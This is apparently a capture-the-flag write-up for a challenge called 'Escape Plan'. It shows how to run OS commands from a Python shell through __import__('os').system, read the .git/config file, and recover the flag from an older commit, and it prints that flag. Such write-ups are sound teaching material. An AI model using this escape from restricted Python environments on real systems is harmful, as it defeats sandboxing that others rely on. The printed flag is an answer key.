# Escape Plan

We are given a python shell.
Run shell commands using `os.system` in python.

```py
__import__('os').system('ls -a')
```

```txt
.
..
.git
crypto.py
start.sh
```

We see its a git repository.

```py
__import__('os').system('cat .git/config')
```

```txt
[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
    logallrefupdates = true
[remote "origin"]
    url = https://github.com/alias-rahil/crypto-cli
    fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
    remote = origin
    merge = refs/heads/master

```

Now, go to url, and see older commits. Flag is in <https://github.com/alias-rahil/crypto-cli/commit/49a38ff762edca98ce3135e2acfbcc8e05161b4f>.  

```txt
csictf{2077m4y32_h45_35c4p3d}
```
